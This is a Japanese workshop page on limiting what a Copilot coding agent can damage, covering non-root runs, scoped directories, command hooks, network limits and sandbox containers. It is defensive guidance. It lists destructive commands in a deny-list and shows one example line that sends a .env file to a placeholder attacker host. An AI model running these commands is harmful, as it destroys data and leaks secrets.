# Blast-radius を絞る

Hook と Approval プロンプトは **既知の悪パターン** を捕まえる仕組み。このページは
その下に敷く多層防御 — **hook が見逃しうっかり `y` を押した最悪ケースでも、
Copilot ができることの上限を縛る方法** です。

考え方は通常の自動化と同じ「最小権限の原則」 — 仕事をするのに足る最小の環境だけを
エージェントに与える。

## 非特権実行 { #run-unprivileged }

| やる | やらない |
|---|---|
| `copilot` を通常ユーザーで起動 | `root`、`--privileged` コンテナ、`sudo copilot` で起動 |
| 資格情報 (`~/.ssh`、`~/.aws`、`~/.kube`、`.env*`) を `chmod 600` | 読まれたくない `.env` を Copilot 実行ユーザー読み取り可能のまま放置 |
| 短命トークン (`gh auth refresh`、AWS STS、GCP `application-default`) を使う | 広い scope の長命 PAT を使う |
| 昇格が必要ならセッション終了 → 手動で実行 → 戻る | Copilot ユーザーを `sudoers` に入れる |

Codespaces や dev container ではほぼ自動でこの形になります。個人ラップトップでは
意識的に選ぶ必要があります。

## 作業ディレクトリを絞る

エージェントのデフォルト `cwd` は `copilot` を起動した場所。**単一プロジェクト内**で
起動してください、ホームディレクトリではなく:

```bash
cd ~/work/some-feature-branch
copilot                  # cwd = ~/work/some-feature-branch
```

vs:

```bash
cd ~
copilot                  # cwd = ~  → blast radius がはるかに広い
```

信頼できない入力に対する単発タスクは、新規スクラッチで:

```bash
mkdir -p /tmp/copilot-scratch-$(date +%s) && cd $_
copilot
```

## Deny-list hook { #deny-list-hook }

「むやみに承認しない」の正攻法。コピペ可能ファイルと walkthrough は
[`examples/hooks/deny-dangerous-commands/`](https://github.com/ChibaYuki347/copilot-harness-workshop/tree/main/examples/hooks/deny-dangerous-commands)。

最小インストール:

```bash
mkdir -p .github/hooks/deny-dangerous-commands
cp examples/hooks/deny-dangerous-commands/* .github/hooks/deny-dangerous-commands/
chmod +x .github/hooks/deny-dangerous-commands/check-bash.sh
```

ブロックするもの (デフォルト — チームに合わせて調整):

- `rm -rf /` / `rm -rf ~` / `rm -rf $HOME`
- `curl … | sh`、`wget … | sh`
- fork bomb、`mkfs`、ディスクデバイスへの生 `dd`
- `chmod 777 /`、`chown … /`

再確認を強制するもの:

- `git push --force*`、`git reset --hard`、`git clean -fd`
- `sudo …`
- `gh repo delete`、`gh secret set`
- `terraform apply|destroy`、`kubectl delete ns`、`docker system prune`

Hook は `preToolUse` で `bash` ツール限定。`edit` や特定の MCP ツールも
ガードしたい場合は `hooks.json` に別エントリを追加してください。

### クロスホスト

同じ `.github/hooks/*.json` が Copilot CLI と VS Code Copilot Chat Preview の
両方で動作。[Hooks → VS Code variant](../customizations/hooks.md#vs-code-variant) 参照。

## Shell の allow-list

deny-list の代わり (または追加) として、「これらのプレフィックスだけ自動許可」
方針に反転することもできます:

```bash
copilot \
  --allow-tool 'bash(npm test:*)' \
  --allow-tool 'bash(pytest:*)' \
  --allow-tool 'bash(git status:*)' \
  --allow-tool 'bash(git diff:*)' \
  --allow-tool 'bash(git log:*)' \
  --allow-tool 'bash(ls *:*)' \
  --allow-tool 'view'
```

allow-list 外は通常の承認プロンプトに回ります — エージェントは `rm` を提案できますが、
あなたが `y` を押さない限り走りません。

allow-list と deny-list hook を組み合わせると多層防御になります:

- **Allow-list** が auto-approve の範囲を決める (「テストランナーだけは無音で」)
- **Deny-list hook** が approve 結果に関わらず拒否を出す (「`rm -rf /` は `y` を
  押しても絶対だめ」)

## ネットワーク { #network }

最も効くが最も見落とされる blast-radius レバー。

脅威:

- 持ち出しを行う bash (`curl https://attacker.example/?$(cat .env)`)
- 未審査の入力をアップロードする MCP サーバー
- モデルが URL を fetch し、応答を権威ある入力として扱ってしまう

対策、強度順:

1. **ネットワーク制限コンテナで実行**。インターネット不要なセッション (純粋な
   コーディング中心) は `podman run --network=none …`。あるいは
   パッケージレジストリ / GitHub / LLM エンドポイントだけ許可する sidecar firewall。
2. **DNS allow-list**。ローカル resolver (`unbound`、`dnsmasq`) が `github.com`、
   `api.github.com`、`registry.npmjs.org`、`pypi.org`、`*.copilot.com` だけ答え、
   残りは sinkhole。エージェントの不明ホスト `curl` は NXDOMAIN で失敗します。
3. **HTTPS でない、または IP 直の `curl` / `wget` を hook で拒否**。本物の
   firewall より安価だが、エージェントが `python -c …` を使えば bypass されるので
   ベルト + サスペンダー扱い。

機微の高い作業 (規制対象コードベース、本番資格情報を扱う場面) では既定で 1 を選択。

## サンドボックス FS

2 つのパターン:

- **タスク毎スクラッチディレクトリ** (セットアップ不要)。`copilot` を temp dir で
  起動。最悪ケースが閉じる
- **コンテナ + 単一 bind-mount** (セットアップ多め、防御は大幅強化)。触らせたい
  リポだけマウント:

  ```bash
  podman run --rm -it \
    --network=none \
    -v "$PWD:/work:Z" \
    -w /work \
    -e GITHUB_TOKEN \
    ghcr.io/your-org/copilot-sandbox:latest copilot
  ```

  エージェントは `/`、`~`、`/etc` どこでも書けますが、書き込みはコンテナ内に
  閉じ、終了時に破棄されます。

## クイックチェックリスト

大事なものを触る Agent モードセッションを始める前に:

- [ ] 非 root 実行、資格情報は `chmod 600`
- [ ] **プロジェクトディレクトリ** で起動 (`~` ではなく)
- [ ] `deny-dangerous-commands` hook (相当物) 入り
- [ ] `audit-all-tool-calls` hook 入り (あとからログが要る)
- [ ] 機微案件ならネットワーク制限コンテナか DNS allow-list
- [ ] Approval プロンプトが見えている (最小化や別タブ放置になっていない)

## 関連

- [リスクの mental model](./risk-mental-model.md)
- [Approval cheat sheet](./approval-cheatsheet.md)
- [事後の監査](./auditing.md)
- [Recipe → セッション終了時のシークレットスキャン](../recipes/session-end-secret-scan.md)
